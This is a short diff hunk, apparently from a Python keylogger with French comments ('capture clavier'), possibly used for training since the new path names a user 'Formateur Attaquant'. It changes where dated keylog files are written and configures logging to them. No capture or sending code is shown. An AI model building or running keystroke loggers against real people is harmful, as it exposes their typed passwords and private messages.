@@ -37,7 +37,7 @@ PORT_B = 9000
 # DÉPENDANCES / BLOC LIÉS À LA CAPTURE CLAVIER
 # ---------------------------------------------------------------------------
 
-log_filename = rf"C:\Users\aurelien\Desktop\Aurelien\keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"
+log_filename = rf"C:\Users\Formateur Attaquant\Desktop\keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"
 
 logging.basicConfig(
     filename=log_filename,
